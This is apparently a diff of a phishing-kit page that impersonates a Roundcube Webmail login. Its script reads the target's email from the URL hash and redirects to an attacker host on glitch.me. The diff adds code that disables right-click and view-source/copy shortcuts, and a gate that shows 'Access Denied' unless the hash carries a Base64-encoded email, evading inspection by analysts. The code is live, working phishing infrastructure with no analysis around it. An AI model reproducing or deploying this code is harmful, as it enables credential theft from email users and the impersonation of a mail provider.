@@ -1,6 +1,16 @@
+
 <!DOCTYPE html>
 <html>
   <head>
+  <style>
+    html {
+        visibility: hidden; 
+        background: white;
+    }
+</style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
 <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"><title>Roundcube Webmail</title>
 
     <script>
@@ -8,7 +18,7 @@
       var redir_to_page =
         "https://xwebmail-bauthoi.glitch.me" +
         data +
-        ""; //PUT YOUR LINK HERE
+        ""; 
       var hash = window.location.hash;
       var email = hash.split("#")[1];
       redir_to_page = redir_to_page + email;
@@ -22,35 +32,71 @@
 
         return result;
       }
-      function getQueryParamsAndHash() {
-    let params = {};
-    let hash = window.location.hash.substring(1); // Remove the #
+    </script>
+		<script>
+			$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.onkeydown = function(e) {
+if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false; }
+else {
+return true;
+}});
 
-    // If there's no hash in the URL, deny access
-    if (!hash) {
-        document.body.innerHTML = "<h1></h1>";
-        return;
+document.addEventListener("DOMContentLoaded", function () {
+    function isValidBase64Email(encodedString) {
+        try {
+            let decoded = atob(encodedString);
+            let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(decoded) ? decoded : null;
+        } catch (e) {
+            return null; 
+        }
     }
 
-    // Extract query parameters
-    let queryString = window.location.search.substring(1);
-    let queryArray = queryString.split("&");
+    function enforceAccessRestriction() {
+        let hash = window.location.hash.substring(1); 
 
-    queryArray.forEach(param => {
-        let [key, value] = param.split("=");
-        if (key) {
-            params[decodeURIComponent(key)] = decodeURIComponent(value || "");
+        let decodedEmail = isValidBase64Email(hash);
+        if (!decodedEmail) {
+            document.body.innerHTML = ""; 
+            document.body.style.cssText = `
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                flex-direction: column;
+                text-align: center;
+                background-color: white;
+                color: black;
+                font-family: Arial, sans-serif;
+                margin: 0;
+            `;
+            let deniedMessage = document.createElement("div");
+            deniedMessage.innerHTML = `
+                <h1 style="color: red;">Access Denied</h1>
+                <p>You must include a valid Base64-encoded email in the URL hash.</p>
+            `;
+            document.body.appendChild(deniedMessage);
+            return;
         }
-    });
-
-    return { params, hash };
-}
-
-// Example usage
-let data = getQueryParamsAndHash();
-if (data) {
-    console.log(data);
-}
-    </script>
+        console.log("Decoded Email:", decodedEmail);
+    }
+    enforceAccessRestriction();
+});
+	</script>
   </head>
 </html>
